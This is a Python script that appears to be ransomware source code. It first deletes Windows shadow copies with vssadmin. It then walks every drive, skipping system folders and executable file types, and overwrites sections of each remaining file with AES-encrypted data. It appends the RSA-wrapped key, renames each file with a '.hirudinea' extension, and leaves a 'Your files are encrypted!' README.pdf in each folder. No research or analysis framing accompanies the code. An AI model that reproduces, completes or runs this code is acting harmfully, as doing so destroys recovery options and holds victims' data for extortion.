import os
import string
import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from fpdf import FPDF

# Function to delete system shadow copies using vssadmin
def delete_shadow_copies():
    command = "vssadmin Delete Shadows /All /Quiet"
    try:
        subprocess.run(command, shell=True, check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        print("Shadow copies deleted successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to delete shadow copies: {e.stderr.decode()}")

# Function to encrypt and modify files based on their size
def encrypt_file_sections(file_path, cipher, rsa_cipher):
    try:
        # Determine file size
        file_size = os.path.getsize(file_path)
        
        # Open the file to read and write bytes
        with open(file_path, "r+b") as file:
            if file_size <= 2 * 1024 * 1024:  # No division for files <= 2 MB
                data = file.read(1024 * 1024)  # Read the first 1MB or the entire file if smaller
                encrypted_data = cipher.encrypt(data)
                file.seek(0)
                file.write(encrypted_data)  # Overwrite the initial segment of the file
            else:
                # Determine the number of sections
                if file_size <= 3 * 1024 * 1024:
                    num_sections = 2
                else:
                    num_sections = 4
                
                section_size = file_size // num_sections
                # Encrypt and overwrite each section's first 1MB
                for section in range(num_sections):
                    file.seek(section * section_size)
                    data = file.read(1024 * 1024)  # Read up to 1MB
                    encrypted_data = cipher.encrypt(data)
                    file.seek(section * section_size)
                    file.write(encrypted_data)  # Overwrite the initial segment of each section

            # Encrypt the key and IV with RSA and append to the file
            encrypted_key = rsa_cipher.encrypt(key)
            encrypted_iv = rsa_cipher.encrypt(iv)
            file.write(encrypted_key)
            file.write(encrypted_iv)

        # Rename the file with the new extension
        os.rename(file_path, file_path + ".hirudinea")
    except PermissionError:
        print(f"Permission denied for {file_path}. Moving to next file.")
    except Exception as e:
        print(f"Error processing {file_path}: {e}")

# Function to create a README.pdf in the directory
def create_readme_pdf(directory):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Your files are encrypted!", ln=True, align='C')
    pdf.output(os.path.join(directory, "README.pdf"))

# Ignored directories and file extensions
ignored_directories = {
    "/$Recycle.Bin", "/Boot", "/Documents and Settings", "/PerfLogs", "/Program Files",
    "/Program Files (x86)", "/ProgramData", "/Recovery", "/System Volume Information", "/Windows",
    "/$RECYCLE.BIN"
}
ignored_extensions = {
    ".bat", ".bin", ".cab", ".cd", ".com", ".cur", ".dagaba", ".diagcfg", ".diagpkg", ".drv",
    ".dll", ".exe", ".hlp", ".hta", ".ico", ".lnk", ".msi", ".ocx", ".ps1", ".psm1", ".scr",
    ".sys", ".ini", "Thumbs.db", ".url", ".iso"
}

# RSA public key (hardcoded)
public_key = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...[Your Public Key Here]
-----END PUBLIC KEY-----'''
rsa_key = RSA.import_key(public_key)
rsa_cipher = PKCS1_OAEP.new(rsa_key)

# List all present drives from Z to A
available_drives = [f"{drive}:\\" for drive in string.ascii_uppercase[::-1] if os.path.exists(f"{drive}:\\")]

# Create an AES CRT cipher with a random key and IV
key = get_random_bytes(16)  # AES key size can be 16, 24, or 32 bytes
iv = get_random_bytes(16)   # IV size for AES is the same as the block size, 16 bytes
cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=iv)

# Delete shadow copies before encryption
delete_shadow_copies()

# Scan each drive and process files
for drive in available_drives:
    for root, dirs, files in os.walk(drive):
        # Skip ignored directories
        if any(ignored_dir in root for ignored_dir in ignored_directories):
            continue
        processed_files = False
        for file in files:
            if any(file.endswith(ext) for ext in ignored_extensions):
                continue
            file_path = os.path.join(root, file)
            encrypt_file_sections(file_path, cipher, rsa_cipher)
            processed_files = True
        if processed_files:
            create_readme_pdf(root)

# Delete shadow copies after encryption
delete_shadow_copies()

